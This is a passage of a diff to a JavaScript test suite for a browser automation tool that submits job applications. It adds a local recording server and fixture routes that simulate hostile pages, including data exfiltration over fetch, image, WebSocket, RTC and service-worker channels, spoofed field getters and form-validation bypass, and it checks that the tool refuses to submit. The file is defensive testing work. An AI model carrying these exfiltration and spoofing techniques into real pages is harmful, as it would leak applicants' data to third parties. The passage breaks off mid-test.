+  '/native-nested-iframe-srcdoc': nativeConnectedHintMutationPage('nested-iframe-srcdoc', 'pre-chooser'),
+  '/native-move-before-hint': nativeConnectedHintMutationPage('move-before', 'pre-chooser'),
+  '/native-exec-command-hint': nativeConnectedHintMutationPage('exec-command-insert-html', 'pre-chooser'),
+  '/native-stateful-rel-coercion': nativeConnectedHintMutationPage('stateful-rel-coercion', 'pre-chooser'),
+  '/native-safe-string-replace-children': nativeConnectedHintMutationPage('safe-string-replace-children', 'pre-chooser'),
+  '/native-safe-class-list-token': nativeConnectedHintMutationPage('safe-class-list-token', 'pre-chooser'),
+  '/native-safe-markup-primitives': nativeConnectedHintMutationPage('safe-markup-primitives', 'pre-chooser'),
+  '/native-shadow-href-attribute': nativeConnectedHintMutationPage('closed-shadow-href-attribute', 'pre-chooser'),
+  '/native-shadow-href-named-map': nativeConnectedHintMutationPage('closed-shadow-href-named-map', 'pre-chooser'),
+  '/native-shadow-url-component': nativeConnectedHintMutationPage('closed-shadow-url-component', 'pre-chooser'),
+  '/native-get-exfil-fetch': nativeGetExfilPage('fetch'),
+  '/native-get-exfil-image': nativeGetExfilPage('image'),
+  '/native-get-exfil-activation-delayed': NATIVE_DELAYED_ACTIVATION_GET,
+  '/native-cross-site-cookie': NATIVE_CROSS_SITE_COOKIE,
   '/native-get-unsupported': nativeRedirectPage('/native-real').replace('method="post"', 'method="get"'),
+  '/native-validation-novalidate': nativeValidationBypassPage('form'),
+  '/native-validation-formnovalidate': nativeValidationBypassPage('submitter'),
   '/native-redirect-preserve-method': nativeRedirectPage('/native-redirect-307'),
-  '/native-redirect-receipt': nativeRedirectPage('/native-receipt-redirect')
+  '/native-redirect-receipt': nativeRedirectPage('/native-receipt-redirect'),
+  '/native-redirect-userinfo-receipt': nativeRedirectPage('/native-receipt-userinfo-redirect'),
+  '/native-redirect-cookie-receipt': nativeRedirectPage('/native-receipt-cookie-redirect'),
+  '/native-redirect-fragment-receipt': nativeRedirectPage('/native-receipt-fragment-redirect')
 };
 
 const clicks = [];
 const transportRequests = [];
+const getExfilRequests = [];
+const websocketConnections = [];
+const websocketFrames = [];
 const server = http.createServer((request, response) => {
   const url = new URL(request.url, 'http://127.0.0.1');
   if (url.pathname === '/record-click') {
     clicks.push(url.searchParams.get('who'));
+    response.writeHead(204, { connection: 'close' });
+    response.end();
+    return;
+  }
+  if (url.pathname === '/native-get-exfil') {
+    getExfilRequests.push({
+      method: request.method,
+      channel: url.searchParams.get('channel'),
+      value: url.searchParams.get('value')
+    });
     response.writeHead(204, { connection: 'close' });
     response.end();
     return;
@@ -1915,15 +3382,32 @@ const server = http.createServer((request, response) => {
   }
   if (url.pathname === '/native-real'
     || url.pathname === '/native-decoy'
+    || url.pathname === '/native-multipart-real'
+    || url.pathname === '/native-file-integrity-real'
+    || url.pathname === '/native-integrity-real'
+    || url.pathname === '/native-cookie-real'
     || url.pathname === '/native-redirect-307'
     || url.pathname === '/native-receipt-redirect'
-    || url.pathname === '/native-receipt') {
+    || url.pathname === '/native-receipt-userinfo-redirect'
+    || url.pathname === '/native-receipt'
+    || url.pathname === '/native-receipt-cookie-redirect'
+    || url.pathname === '/native-receipt-fragment-redirect'
+    || url.pathname === '/native-receipt-cookie') {
     const chunks = [];
     const recordedRequest = { method: request.method, path: url.pathname, body: null };
     transportRequests.push(recordedRequest);
     request.on('data', (chunk) => { chunks.push(chunk); });
     request.on('end', () => {
-      recordedRequest.body = Buffer.concat(chunks).toString('utf8');
+      const bodyBuffer = Buffer.concat(chunks);
+      recordedRequest.body = bodyBuffer.toString('utf8');
+      const contentType = String(request.headers['content-type'] || '');
+      if (/^multipart\/form-data(?:;|$)/i.test(contentType)) {
+        recordedRequest.contentType = contentType;
+        recordedRequest.bodyBase64 = bodyBuffer.toString('base64');
+      }
+      if (url.pathname === '/native-cookie-real') {
+        recordedRequest.cookie = String(request.headers.cookie || '');
+      }
       if (url.pathname === '/native-redirect-307') {
         response.writeHead(307, { location: '/native-decoy', connection: 'close' });
         response.end();
@@ -1933,6 +3417,36 @@ const server = http.createServer((request, response) => {
         response.writeHead(303, { location: '/native-receipt', connection: 'close' });
         response.end();
         return;
+      }
+      if (url.pathname === '/native-receipt-userinfo-redirect') {
+        response.writeHead(303, {
+          location: 'http://receipt:secret@127.0.0.1:' + server.address().port + '/native-receipt',
+          connection: 'close'
+        });
+        response.end();
+        return;
+      }
+      if (url.pathname === '/native-receipt-cookie-redirect') {
+        response.writeHead(303, {
+          location: '/native-receipt-cookie',
+          'set-cookie': 'receipt_session=ready; Path=/; HttpOnly; SameSite=Lax',
+          connection: 'close'
+        });
+        response.end();
+        return;
+      }
+      if (url.pathname === '/native-receipt-fragment-redirect') {
+        response.writeHead(303, { location: '/native-receipt#done', connection: 'close' });
+        response.end();
+        return;
+      }
+      if (url.pathname === '/native-receipt-cookie') {
+        recordedRequest.cookie = String(request.headers.cookie || '');
+        if (!recordedRequest.cookie.includes('receipt_session=ready')) {
+          response.writeHead(403, { 'content-type': 'text/html; charset=utf-8', connection: 'close' });
+          response.end('<div id="submitted">receipt cookie missing</div>');
+          return;
+        }
       }
       response.writeHead(200, { 'content-type': 'text/html; charset=utf-8', connection: 'close' });
       response.end(`<!doctype html><meta charset="utf-8"><title>Application received</title>
@@ -1949,10 +3463,24 @@ const server = http.createServer((request, response) => {
   response.writeHead(200, { 'content-type': 'text/html; charset=utf-8', connection: 'close' });
   response.end(body);
 });
-server.on('upgrade', (request, socket) => {
+const webSocketServer = new WebSocketServer({ noServer: true });
+server.on('upgrade', (request, socket, head) => {
   const url = new URL(request.url, 'http://127.0.0.1');
-  if (url.pathname === '/record-click') clicks.push(url.searchParams.get('who'));
-  socket.destroy();
+  if (url.pathname !== '/v4-websocket') {
+    socket.destroy();
+    return;
+  }
+  webSocketServer.handleUpgrade(request, socket, head, (client) => {
+    webSocketServer.emit('connection', client, request);
+  });
+});
+webSocketServer.on('connection', (client) => {
+  websocketConnections.push('connected');
+  client.on('message', (message) => {
+    websocketFrames.push(Buffer.from(message).toString('utf8'));
+    client.close();
+  });
+  setTimeout(() => client.close(), 250).unref();
 });
 await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
 
@@ -1987,25 +3515,80 @@ function writeInput(fixture, extras, overrides, before = []) {
   }));
 }
 
-function startRunner() {
+function startRunner(extraEnv = {}) {
   const child = spawn(process.execPath, ['--require', path.join(HERE, 'managed-runner-shim.cjs'), 'stratus-runner.cjs'], {
     cwd: workDir,
-    env: { ...process.env, NODE_PATH: path.join(process.cwd(), 'node_modules') }
+    env: { ...process.env, ...extraEnv, NODE_PATH: path.join(process.cwd(), 'node_modules') },
+    detached: process.platform !== 'win32'
   });
   child.stderr.resume();
   child.stdout.resume();
   return child;
 }
 
+const RUNNER_TIMEOUT_MS = 60_000;
+
+function killRunnerProcessGroup(child) {
+  if (child.exitCode !== null || child.signalCode !== null) return;
+  if (process.platform !== 'win32') {
+    try {
+      process.kill(-child.pid, 'SIGKILL');
+      return;
+    } catch (error) {
+      if (error?.code !== 'ESRCH') throw error;
+    }
+  }
+  try {
+    child.kill('SIGKILL');
+  } catch (error) {
+    if (error?.code !== 'ESRCH') throw error;
+  }
+}
+
+function waitForRunner(child, timeoutMs = RUNNER_TIMEOUT_MS) {
+  return new Promise((resolve, reject) => {
+    let timedOut = false;
+    const timer = setTimeout(() => {
+      timedOut = true;
+      try {
+        killRunnerProcessGroup(child);
+      } catch (error) {
+        reject(error);
+      }
+    }, timeoutMs);
+    child.once('error', (error) => {
+      clearTimeout(timer);
+      reject(error);
+    });
+    child.once('close', (status, signal) => {
+      clearTimeout(timer);
+      resolve({ status, signal, timedOut });
+    });
+  });
+}
+
+async function runRunnerWithTimeout(label, extraEnv = {}, resetAttempt = () => {}) {
+  for (let attempt = 1; attempt <= 2; attempt += 1) {
+    resetAttempt(attempt);
+    const outcome = await waitForRunner(startRunner(extraEnv));
+    if (!outcome.timedOut) return outcome.status;
+    if (attempt === 1) {
+      process.stderr.write(`Runner timed out for ${label}; retrying once.\n`);
+    }
+  }
+  throw new Error(`Runner timed out twice for ${label} after ${RUNNER_TIMEOUT_MS}ms per attempt`);
+}
+
 /** Runs the shipped runner against one fixture. Returns the exit code and the result file if any.
  *  'before' is queued ahead of the submit action, which is how a run that actually fills something
  *  is expressed: the fills a real caller sends always precede its final submit. */
 async function run(fixture, extras = [], before = []) {
-  clicks.length = 0;
   writeInput(fixture, extras, {}, before);
-  fs.rmSync(resultPath(0), { force: true });
-  fs.rmSync(path.join(workDir, 'stratus-error.json'), { force: true });
-  const status = await new Promise((resolve) => startRunner().on('close', resolve));
+  const status = await runRunnerWithTimeout(fixture, {}, (attempt) => {
+    if (attempt === 1) clicks.length = 0;
+    fs.rmSync(resultPath(0), { force: true });
+    fs.rmSync(path.join(workDir, 'stratus-error.json'), { force: true });
+  });
   return { status, result: readResult(0), clicks: [...clicks] };
 }
 
@@ -2014,7 +3597,6 @@ const V4_APPLICATION_SCOPE_SELECTORS = Object.freeze({
   '/application-support-bare-send': '#application_support',
   '/application-profile-bare-send': '#application_profile',
   '/application-status-bare-send': '#application_status',
-  '/ashby': '.ashby-job-posting-right-pane',
   '/async-labelled-digit-drift': '#candidate_application',
   '/async-text-drift': '#candidate_application',
   '/candidate-support-bare-send': '#candidate_contact',
@@ -2030,12 +3612,15 @@ const V4_APPLICATION_SCOPE_SELECTORS = Object.freeze({
   '/custom-submit-choice': '#application_form',
   '/direct-marker-redirect': '#application_form',
   '/external-associated-bare-send': '#application_form',
+  '/explicit-submit-only-unrelated-proof': '#application_form',
   '/external-required-control': '#application_form',
   '/failed-choice-replace': '#application_form',
   '/failed-choice-strip': '#application_form',
   '/failed-text-persistence': '#candidate_application',
   '/fill-by-date-normalization': '#application_form',
+  '/fill-by-inferred-date-normalization': '#application_form',
   '/fill-by-phone-format': '#application_form',
+  '/fill-by-inferred-phone-format': '#application_form',
   '/fill-by-select-label': '#application_form',
   '/fill-by-select-punctuation': '#application_form',
   '/fill-by-target-swap': '#application_form',
@@ -2058,16 +3643,114 @@ const V4_APPLICATION_SCOPE_SELECTORS = Object.freeze({
   '/native-activation-pointerdown': '#application_form',
   '/native-activation-submit-action': '#application_form',
   '/native-activation-submit-association': '#application_form',
+  '/native-activation-submit-aria-required': '#application_form',
+  '/native-activation-submit-star-marker': '#application_form',
+  '/native-activation-submit-cancel-direct-real': '#application_form',
+  '/native-activation-pre-arm-required': '#application_form',
   '/native-activation-synthetic-witness': '#application_form',
-  '/native-activation-side-channels': '#application_form',
-  '/late-final-action-drift': '#application_form',
-  '/late-final-hidden-drift': '#application_form',
-  '/late-final-submit-text-drift': '#application_form',
+  '/workable-native-allowlist-empty': '#application',
+  '/native-constraint-custom-validity-clear': '#application_form',
+  '/native-constraint-pattern-removal': '#application_form',
+  '/native-formdata-crypto-monkeypatch': '#application_form',
+  '/native-page-state-forgery': '#application_form',
+  '/native-file-byte-substitution': '#application_form',
+  '/native-text-value-getter-spoof': '#application_form',
+  '/native-select-value-getter-spoof': '#application_form',
+  '/native-textarea-whitespace-drift': '#application_form',
+  '/native-hidden-choice-label-spoof': '#application_form',
+  '/native-legacy-verifier-write-drift': '#application_form',
+  '/native-main-world-primordial-patches': '#application_form',
+  '/native-nameless-proof-controls': '#application_form',
+  '/native-multi-select-injection': '#application_form',
+  '/native-form-owner-getter-spoof': '#application_form',
+  '/native-forged-submit-label': '#application_form',
+  '/native-hidden-submit-text': '#application_form',
+  '/native-opacity-zero-submit': '#application_form',
+  '/native-optin-value-getter-spoof': '#application_form',
+  '/native-required-selector-spoof': '#application_form',
+  '/native-custom-required-selector-spoof': '#application_form',
+  '/native-custom-required-aria-only': '#application_form',
+  '/native-required-class-marker-spoof': '#application_form',
+  '/native-required-star-marker-spoof': '#application_form',
+  '/native-required-unassociated-star-marker-spoof': '#application_form',
+  '/native-required-disabled-choice-peer': '#application_form',
+  '/native-required-native-disabled-choice-peer': '#application_form',
+  '/native-required-mixed-choice-peer': '#application_form',
+  '/native-required-disabled-option': '#application_form',
+  '/native-required-disabled-optgroup': '#application_form',
+  '/native-required-native-disabled-option': '#application_form',
+  '/native-required-native-disabled-optgroup': '#application_form',
+  '/native-required-empty-option': '#application_form',
+  '/native-optional-hidden-star': '#application_form',
+  '/native-starred-legend-empty': '#application_form',
+  '/native-starred-legend-answered': '#application_form',
+  '/native-starred-legend-hidden-backing': '#application_form',
+  '/native-custom-required-mixed-group': '#application_form',
+  '/native-custom-required-display-contents': '#application_form',
+  '/native-custom-required-oversized-owner': '#application_form',
+  '/native-barred-required-controls': '#application_form',
+  '/native-external-custom-required-empty': '#application_form',
+  '/native-external-custom-required-answered': '#application_form',
+  '/native-external-marker-required-empty': '#application_form',
+  '/native-external-aria-owns-empty': '#application_form',
+  '/native-external-aria-owns-answered': '#application_form',
+  '/native-required-fieldset-empty': '#application_form',
+  '/native-required-fieldset-answered': '#application_form',
+  '/native-aria-label-drift': '#application_form',
+  '/native-aria-label-choice-proof': '#application_form',
+  '/native-unselected-image-control': '#application_form',
+  '/native-userinfo-action': '#application_form',
+  '/native-late-file-getter-substitution': '#application_form',
+  '/native-reversible-file-proof-swap': '#application_form',
+  '/native-multipart-serializer': '#application_form',
+  '/native-multipart-serializer-empty': '#application_form',
+  '/native-get-exfil-fetch': '#application_form',
+  '/native-get-exfil-image': '#application_form',
+  '/native-get-exfil-activation-delayed': '#application_form',
+  '/native-websocket-pre-chooser': '#application_form',
+  '/native-websocket-activation': '#application_form',
+  '/native-rtc-pre-chooser': '#application_form',
+  '/native-webtransport-activation': '#application_form',
+  '/native-websocketstream-pre-chooser': '#application_form',
+  '/native-websocketstream-activation': '#application_form',
+  '/native-serviceworker-pre-chooser': '#application_form',
+  '/native-popup-route-invisible': '#application_form',
+  '/native-document-open-popup': '#application_form',
+  '/native-data-frame-hint': '#application_form',
+  '/native-data-popup-hint': '#application_form',
+  '/native-initial-script-transport': '#application_form',
+  '/native-dns-prefetch-pre-chooser': '#application_form',
+  '/native-preconnect-activation': '#application_form',
+  '/native-connected-rel-pre-chooser': '#application_form',
+  '/native-connected-rel-list-activation': '#application_form',
+  '/native-shadow-hint-inner-html': '#application_form',
+  '/native-closed-shadow-replace-children': '#application_form',
+  '/native-closed-shadow-large-fragment': '#application_form',
+  '/native-closed-shadow-entity-inner-html': '#application_form',
+  '/native-closed-shadow-attr-node-value': '#application_form',
+  '/native-closed-shadow-named-node-map': '#application_form',
+  '/native-variadic-document-write': '#application_form',
+  '/native-nested-iframe-srcdoc': '#application_form',
+  '/native-move-before-hint': '#application_form',
+  '/native-exec-command-hint': '#application_form',
+  '/native-stateful-rel-coercion': '#application_form',
+  '/native-safe-string-replace-children': '#application_form',
+  '/native-safe-class-list-token': '#application_form',
+  '/native-safe-markup-primitives': '#application_form',
+  '/native-shadow-href-attribute': '#application_form',
+  '/native-shadow-href-named-map': '#application_form',
+  '/native-shadow-url-component': '#application_form',
+  '/native-cross-site-cookie': '#application_form',
   '/native-get-unsupported': '#application_form',
   '/native-redirect-preserve-method': '#application_form',
   '/native-redirect-receipt': '#application_form',
+  '/native-redirect-userinfo-receipt': '#application_form',
+  '/native-redirect-cookie-receipt': '#application_form',
+  '/native-redirect-fragment-receipt': '#application_form',
   '/native-serializer-empty-file': '#application_form',
   '/native-serializer-populated-file': '#application_form',
+  '/native-validation-formnovalidate': '#application_form',
+  '/native-validation-novalidate': '#application_form',
   '/over-bound-submitted-state': '#application_form',
   '/pre-chooser-base-drift': '#application_form',
   '/pre-chooser-method-drift': '#application_form',
@@ -2099,25 +3782,30 @@ const V4_APPLICATION_SCOPE_SELECTORS = Object.freeze({
   '/workable-formaction-override': '#application',
   '/workable-proof-loss-explicit-decoy': '#application',
   '/workable-prechooser-auto-submit': '#application',
-  '/cross-form-optin-decoy': '#application_form',
-  '/action-boundary-drift': '#application_form',
   '/workable-role-send': '#application',
   '/workable-unrelated-form': '#application',
   '/workable-native-allowlist': 'form:has(input[name="firstname"]):has(input[name="email"]):has(input[type="file"][data-ui="resume"])'
 });
+
+const V4_INTENTIONALLY_UNBOUND_FIXTURES = new Set(['/ashby']);
 
 function v4ApplicationScopeFor(fixture) {
   const fixturePath = fixture.split('?')[0];
   if (Object.hasOwn(V4_APPLICATION_SCOPE_SELECTORS, fixturePath)) {
     return V4_APPLICATION_SCOPE_SELECTORS[fixturePath];
   }
+  if (V4_INTENTIONALLY_UNBOUND_FIXTURES.has(fixturePath)) return null;
   throw new Error('runV4 fixture must declare an application scope classification: ' + fixturePath);
 }
 
-async function runV4(fixture, before = [], extras = []) {
-  clicks.length = 0;
-  transportRequests.length = 0;
-  const expectedPageUrl = `http://127.0.0.1:${server.address().port}${fixture}`;
+async function runV4(
+  fixture,
+  before = [],
+  extras = [],
+  origin = `http://127.0.0.1:${server.address().port}`,
+  runnerEnv = {}
+) {
+  const expectedPageUrl = origin + fixture;
   const applicationScopeSelector = v4ApplicationScopeFor(fixture);
   const v4Submit = {
     ...submitAction,
@@ -2144,10 +3832,18 @@ async function runV4(fixture, before = [], extras = []) {
     waitUntil: 'networkidle',
     viewport: { width: 1440, height: 900 }
   }));
-  fs.rmSync(resultPath(0), { force: true });
-  fs.rmSync(path.join(workDir, 'stratus-error.json'), { force: true });
-  fs.rmSync(path.join(workDir, 'stratus-screenshot-0.png'), { force: true });
-  const status = await new Promise((resolve) => startRunner().on('close', resolve));
+  const status = await runRunnerWithTimeout(fixture, runnerEnv, (attempt) => {
+    if (attempt === 1) {
+      clicks.length = 0;
+      transportRequests.length = 0;
+      getExfilRequests.length = 0;
+      websocketConnections.length = 0;
+      websocketFrames.length = 0;
+    }
+    fs.rmSync(resultPath(0), { force: true });
+    fs.rmSync(path.join(workDir, 'stratus-error.json'), { force: true });
+    fs.rmSync(path.join(workDir, 'stratus-screenshot-0.png'), { force: true });
+  });
   const errorFile = path.join(workDir, 'stratus-error.json');
   return {
     status,
@@ -2155,12 +3851,14 @@ async function runV4(fixture, before = [], extras = []) {
     error: fs.existsSync(errorFile) ? JSON.parse(fs.readFileSync(errorFile, 'utf8')) : null,
     clicks: [...clicks],
     requests: [...transportRequests],
+    getExfilRequests: [...getExfilRequests],
+    websocketConnections: [...websocketConnections],
+    websocketFrames: [...websocketFrames],
     screenshot: fs.existsSync(path.join(workDir, 'stratus-screenshot-0.png'))
   };
 }
 
 async function runV3Prepare(fixture, actions) {
-  clicks.length = 0;
   const expectedPageUrl = `http://127.0.0.1:${server.address().port}${fixture}`;
   fs.writeFileSync(path.join(workDir, 'stratus-input.json'), JSON.stringify({
     url: expectedPageUrl,
@@ -2173,15 +3871,73 @@ async function runV3Prepare(fixture, actions) {
     waitUntil: 'networkidle',
     viewport: { width: 1440, height: 900 }
   }));
-  fs.rmSync(resultPath(0), { force: true });
-  fs.rmSync(path.join(workDir, 'stratus-error.json'), { force: true });
-  const status = await new Promise((resolve) => startRunner().on('close', resolve));
+  const status = await runRunnerWithTimeout(fixture, {}, (attempt) => {
+    if (attempt === 1) clicks.length = 0;
+    fs.rmSync(resultPath(0), { force: true });
+    fs.rmSync(path.join(workDir, 'stratus-error.json'), { force: true });
+  });
   return { status, result: readResult(0), clicks: [...clicks] };
 }
 
 const valueOf = (result, selector) => result.extracted.find((entry) => entry.selector === selector)?.value;
 
-test.after(() => { server.close(); fs.rmSync(workDir, { recursive: true, force: true }); });
+const recordedMultipartParts = (request) => {
+  const boundary = String(request.contentType || '').match(/boundary=(?:"([^"]+)"|([^;\s]+))/i);
+  assert.ok(boundary, 'multipart request must carry a boundary');
+  const marker = Buffer.from('--' + (boundary[1] || boundary[2]));
+  const body = Buffer.from(request.bodyBase64, 'base64');
+  const parts = [];
+  let cursor = body.indexOf(marker);
+  while (cursor !== -1) {
+    cursor += marker.length;
+    if (body.subarray(cursor, cursor + 2).equals(Buffer.from('--'))) break;
+    assert.ok(body.subarray(cursor, cursor + 2).equals(Buffer.from('\r\n')));
+    cursor += 2;
+    const headerEnd = body.indexOf(Buffer.from('\r\n\r\n'), cursor);
+    assert.notEqual(headerEnd, -1);
+    const headers = body.subarray(cursor, headerEnd).toString('utf8');
+    const next = body.indexOf(Buffer.from('\r\n--' + (boundary[1] || boundary[2])), headerEnd + 4);
+    assert.notEqual(next, -1);
+    const disposition = headers.split('\r\n').find((line) => /^content-disposition:/i.test(line)) || '';
+    const name = disposition.match(/(?:^|;)\s*name="([^"]*)"/i)?.[1];
+    const filename = disposition.match(/(?:^|;)\s*filename="([^"]*)"/i)?.[1];
+    const type = headers.split('\r\n').find((line) => /^content-type:/i.test(line));
+    parts.push({
+      name,
+      ...(filename == null ? {} : { filename }),
+      ...(type ? { contentType: type.slice(type.indexOf(':') + 1).trim() } : {}),
+      bytesBase64: body.subarray(headerEnd + 4, next).toString('base64')
+    });
+    cursor = next + 2;
+  }
+  return parts;
+};
+
+const multipartTextPart = (name, value) => ({
+  name,
+  bytesBase64: Buffer.from(value).toString('base64')
+});
+
+const multipartFilePart = (name, filename = 'resume.pdf', bytes = Buffer.from('resume')) => ({
+  name,
+  filename,
+  contentType: filename ? 'application/pdf' : 'application/octet-stream',
+  bytesBase64: bytes.toString('base64')
+});
+
+const assertMultipartPost = (request, pathName, expectedParts) => {
+  assert.equal(request?.method, 'POST');
+  assert.equal(request?.path, pathName);
+  assert.match(String(request?.contentType || ''), /^multipart\/form-data;/i);
+  assert.deepEqual(recordedMultipartParts(request), expectedParts);
+};
+
+test.after(() => {
+  for (const client of webSocketServer.clients) client.terminate();
+  webSocketServer.close();
+  server.close();
+  fs.rmSync(workDir, { recursive: true, force: true });
+});
 
 const workableV4Fills = () => [
   { type: 'fill', selector: '#first-name', value: 'Mehek', label: 'first_name' },
@@ -2216,25 +3972,29 @@ const nativeSerializerV4Fills = (populateFile) => [
   }] : [])
 ];
 
-const assertScriptInterceptedNativeTransport = (
-  result,
-  blockerReason = 'submit_transport_unsupported',
-  chooserOutcome = 'selected'
-) => {
+const assertScriptInterceptedNativeTransport = (result) => {
+  assert.ok(result?.requiredFieldConfirmation, JSON.stringify(result, null, 2));
   assert.equal(result.submitOutcome.pressed, false);
   assert.equal(result.requiredFieldConfirmation.status, 'blocked');
-  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, blockerReason);
-  assert.equal(result.finalSubmitChooser.outcome, chooserOutcome);
+  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_transport_unsupported');
+  assert.equal(result.finalSubmitChooser.outcome, 'transport_unsupported');
+};
+
+const assertScriptInterceptedPostTransport = (result) => {
+  assert.equal(result.submitOutcome.pressed, false);
+  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_transport_unpinned');
+  assert.equal(result.finalSubmitChooser.outcome, 'activation_blocked');
 };
 
 const assertUnsupportedNativeSubmitter = (result) => {
   assert.equal(result.submitOutcome.pressed, false);
   assert.equal(result.requiredFieldConfirmation.status, 'blocked');
-  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_payload_unverifiable');
-  assert.equal(result.finalSubmitChooser.outcome, 'selected');
+  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_transport_unsupported');
+  assert.equal(result.finalSubmitChooser.outcome, 'transport_unsupported');
 };
 
-test('v4 blocks a Workable-like bare Send whose script intercepts native transport', async () => {
+test('v4 blocks a Workable-like bare Send whose form uses unsupported GET transport', async () => {
   const { status, result, error, clicks: recorded, screenshot } = await runV4(
     '/workable-bare-send',
     workableV4Fills()
@@ -2249,7 +4009,7 @@ test('v4 blocks a Workable-like bare Send whose script intercepts native transpo
     policyVersion: 4,
     grammarHash: ATOMIC_SUBMIT_POLICY_V4.grammarHash,
     submitKind: 'application',
-    outcome: 'selected',
+    outcome: 'transport_unsupported',
     candidateCount: 1,
     viableCandidateCount: 1,
     topScore: 0,
@@ -2371,9 +4131,22 @@ test('v4 accepts fillByLabelText phone formatting as a verified bare-Send proof'
   assertScriptInterceptedNativeTransport(result);
 });
 
+test('v4 accepts inferred type-text phone formatting as a verified bare-Send proof', async () => {
+  const { status, result, clicks: recorded } = await runV4('/fill-by-inferred-phone-format', [
+    { type: 'fillByLabelText', text: 'Phone', value: '2135746270' },
+    {
+      type: 'upload', selector: '#phone-resume',
+      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
+    }
+  ]);
+  assert.equal(status, 0);
+  assert.deepEqual(recorded, []);
+  assertScriptInterceptedNativeTransport(result);
+});
+
 test('v4 accepts a native option label as a verified bare-Send proof', async () => {
   const { status, result, clicks: recorded } = await runV4('/fill-by-select-label', [
-    { type: 'fillByLabelText', text: 'Department', value: 'Engineering' },
+    { type: 'fillByLabelText', text: 'Department', value: 'engineering' },
     {
       type: 'upload', selector: '#select-resume',
       file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
@@ -2417,6 +4190,19 @@ test('v4 invalidates a native select proof when only its selected option label c
 
 test('v4 accepts a normalized date control as a verified bare-Send proof', async () => {
   const { status, result, clicks: recorded } = await runV4('/fill-by-date-normalization', [
+    { type: 'fillByLabelText', text: 'Graduation date', value: 'May 2028' },
+    {
+      type: 'upload', selector: '#date-resume',
+      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
+    }
+  ]);
+  assert.equal(status, 0);
+  assert.deepEqual(recorded, []);
+  assertScriptInterceptedNativeTransport(result);
+});
+
+test('v4 accepts inferred type-text datepicker normalization as a verified bare-Send proof', async () => {
+  const { status, result, clicks: recorded } = await runV4('/fill-by-inferred-date-normalization', [
     { type: 'fillByLabelText', text: 'Graduation date', value: 'May 2028' },
     {
       type: 'upload', selector: '#date-resume',
@@ -2487,7 +4273,7 @@ test('v4 never records a nonempty but different failed text persistence as proof
   assert.equal(screenshot, true);
   assert.equal(result.submitOutcome.pressed, false);
   assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
-  assert.equal(result.finalSubmitChooser.candidateCount, 1);
+  assert.equal(result.finalSubmitChooser.candidateCount, 0);
   assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
   assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
   assert.equal(result.exactPageUrlProof.beforeFinalChooser, result.exactPageUrlProof.expected);
@@ -2561,11 +4347,11 @@ test('v4 native activation submits only the caller-bound real application endpoi
   );
   assert.equal(status, 0, JSON.stringify({ error, requests, screenshot }));
   assert.deepEqual(recorded, []);
-  assert.deepEqual(requests, [{
-    method: 'POST',
-    path: '/native-real',
-    body: 'email=applicant%40example.com&resume=resume.pdf'
-  }], JSON.stringify(result));
+  assert.equal(requests.length, 1);
+  assertMultipartPost(requests[0], '/native-real', [
+    multipartTextPart('email', 'applicant@example.com'),
+    multipartFilePart('resume')
+  ]);
   assert.equal(result.submitOutcome.pressed, true);
   assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
   assert.equal(result.finalSubmitChooser.outcome, 'selected');
@@ -2588,15 +4374,44 @@ test('v4 Workable allowlist selector binds exactly one native application form',
   );
   assert.equal(status, 0, JSON.stringify(error));
   assert.deepEqual(recorded, []);
-  assert.deepEqual(requests, [{
-    method: 'POST',
-    path: '/native-real',
-    body: 'firstname=Mehek&email=applicant%40example.com&avatar=&resume=resume.pdf'
-  }], JSON.stringify(result));
+  assert.equal(requests.length, 1, JSON.stringify({ error, result, requests }));
+  assertMultipartPost(requests[0], '/native-real', [
+    multipartTextPart('firstname', 'Mehek'),
+    multipartTextPart('email', 'applicant@example.com'),
+    multipartFilePart('avatar', '', Buffer.alloc(0)),
+    multipartFilePart('resume'),
+    multipartTextPart('5854743', 'hackathon')
+  ]);
   assert.equal(result.submitOutcome.pressed, true);
   assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
   assert.equal(result.requiredFieldConfirmation.passes[0].scope.scopeKind, 'form');
   assert.equal(result.finalSubmitChooser.outcome, 'selected');
+});
+
+test('v4 blocks the same Workable checkbox question when no unique-name option is checked', async () => {
+  const { status, result, error, clicks: recorded, requests } = await runV4(
+    '/workable-native-allowlist-empty',
+    [
+      { type: 'fill', selector: '#workable-firstname', value: 'Mehek', label: 'first_name' },
+      { type: 'fill', selector: '#workable-email', value: 'applicant@example.com', label: 'email' },
+      {
+        type: 'upload', selector: '#workable-resume', label: 'resume',
+        file: {
+          name: 'resume.pdf', mimeType: 'application/pdf',
+          base64: Buffer.from('resume').toString('base64')
+        }
+      }
+    ]
+  );
+  assert.equal(status, 0, JSON.stringify(error));
+  assert.deepEqual(recorded, []);
+  assert.deepEqual(requests, []);
+  assert.equal(result.submitOutcome.pressed, false);
+  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
+  assert.match(
+    result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
+    /Which development experience applies\?|Required application control "5854742" is empty/
+  );
 });
 
 test('v4 rejects a native GET application form before any request', async () => {
@@ -2610,8 +4425,52 @@ test('v4 rejects a native GET application form before any request', async () => 
   assert.equal(result.submitOutcome.pressed, false);
   assert.equal(result.requiredFieldConfirmation.status, 'blocked');
   assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_transport_unsupported');
-  assert.equal(result.finalSubmitChooser.outcome, 'selected');
+  assert.equal(result.finalSubmitChooser.outcome, 'transport_unsupported');
 });
+
+for (const validationBypass of [
+  ['form novalidate', '/native-validation-novalidate'],
+  ['submitter formnovalidate', '/native-validation-formnovalidate']
+]) {
+  test('v4 rejects native POST validation bypass through ' + validationBypass[0], async () => {
+    const { status, result, error, clicks: recorded, requests } = await runV4(
+      validationBypass[1],
+      [
+        ...minimalV4Fills('#native-email', '#native-resume'),
